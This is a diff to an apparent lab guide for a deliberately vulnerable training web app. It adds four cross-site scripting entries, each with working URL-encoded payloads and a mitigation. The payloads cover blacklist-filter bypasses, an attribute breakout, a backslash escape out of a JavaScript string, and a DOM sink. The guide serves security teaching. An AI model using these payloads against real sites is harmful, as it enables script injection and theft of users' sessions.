@@ -25,6 +25,11 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
  [04]  Reflected XSS — search result page   (Ch 14)
  [05]  Stored XSS — support messages        (Ch 14)
  [06]  DOM-based XSS — location.hash sink   (Ch 14, 34)
+ [06a] Reflected XSS — naive blacklist (?strict=1) on search (Ch 14)
+ [06b] Reflected XSS — attribute context on search refine input (Ch 14)
+ [06c] Reflected XSS — JavaScript-string context on /login ?next= (Ch 14)
+ [06d] DOM XSS — location.search ?banner= sink (Ch 14)
+
  [07]  IDOR / BAC — view any account        (Ch 11)
  [08]  BAC — admin endpoints unprotected    (Ch 11)
  [09]  BAC — privilege escalation via GET   (Ch 11, 23)
@@ -151,6 +156,76 @@ EXPLOIT
 
 MITIGATION
   Use `textContent` instead of `innerHTML`, or sanitise with DOMPurify.
+
+--------------------------------------------------------------------------------
+ [06a] Reflected XSS — naive blacklist on /accounts/search?strict=1
+--------------------------------------------------------------------------------
+Endpoint:   GET /accounts/search?q=<payload>&strict=1
+File:       routes/accounts.js (single-pass /<script[^>]*>.*?<\/script>/gi)
+
+EXPLOIT (each bypass survives the filter and fires in the heading sink)
+  /accounts/search?strict=1&q=%3Csvg%20onload%3Dalert(1)%3E
+  /accounts/search?strict=1&q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+  /accounts/search?strict=1&q=%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E
+  /accounts/search?strict=1&q=%3Cdetails%20open%20ontoggle%3Dalert(1)%3E
+  /accounts/search?strict=1&q=%3Cmath%3E%3Cmtext%3E%3C%2Fmtext%3E%3Cmglyph%3E%3Cxss%20src%3Dx%20onerror%3Dalert(1)%3E
+  # the filter only matches the literal <script>...</script> shape, so
+  # every other tag family slips through trivially.
+
+MITIGATION
+  Do not blacklist. Either HTML-escape (`<%= %>`) or run output through a
+  context-aware sanitiser (DOMPurify) with an explicit allow-list.
+
+--------------------------------------------------------------------------------
+ [06b] Reflected XSS — attribute context on /accounts/search refine input
+--------------------------------------------------------------------------------
+File:       views/account_search.ejs (<input value="<%- q %>">)
+
+EXPLOIT (break out of the value="..." attribute, no </h1> needed)
+  /accounts/search?q=%22%20autofocus%20onfocus%3Dalert(1)%20x%3D%22
+  # i.e. q = " autofocus onfocus=alert(1) x="
+  # The rendered HTML becomes: <input value="" autofocus onfocus=alert(1) x="">
+
+MITIGATION
+  Use the attribute-context escape (`<%= q %>` does this for EJS, encoding
+  `"` to `&quot;` so the attribute cannot be broken out of). Or render the
+  value via JavaScript with `input.value = q` and never inline it.
+
+--------------------------------------------------------------------------------
+ [06c] Reflected XSS — JavaScript string-literal context on /login ?next=
+--------------------------------------------------------------------------------
+Endpoint:   GET /login?next=<payload>
+File:       views/login.ejs
+            <script>var lastNext = "<%- next.replace(/"/g,'\\\"') %>";</script>
+
+EXPLOIT (the developer escaped `"` but forgot to escape `\`, so a payload
+ending in `\` consumes the escape of the following `"`, ending the string
+exactly where the developer thought it was safest)
+  /login?next=%5C%22%3Balert(1)%3B%2F%2F
+  # i.e. next = \";alert(1);//
+  # Rendered: var lastNext = "\\";alert(1);//";
+  #   -> string ends after `\\`, then a literal `;alert(1);//` statement
+  #   -> alert(1) fires on page load
+
+MITIGATION
+  Never reflect user input into an inline <script>. If you must, JSON.stringify
+  the value AND HTML-escape the output: `<%= JSON.stringify(next) %>`. Better:
+  expose the value via a `data-*` attribute and read it with dataset.
+
+--------------------------------------------------------------------------------
+ [06d] DOM XSS — location.search ?banner= sink
+--------------------------------------------------------------------------------
+File:       public/js/app.js  (slot.innerHTML = URLSearchParams('banner'))
+
+EXPLOIT (unlike the hash sink, this query parameter IS sent to the server, so
+Reqlore History will show the request, but the actual rendering happens in
+the browser DOM and the value never touches a template)
+  http://localhost:3001/accounts?banner=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+MITIGATION
+  Use `textContent`, or sanitise the value via DOMPurify before assigning
+  to `innerHTML`. Better: do not read URL state into the DOM at all without
+  a strict allow-list of values.
 
 --------------------------------------------------------------------------------
  [07] IDOR / BAC — view any account
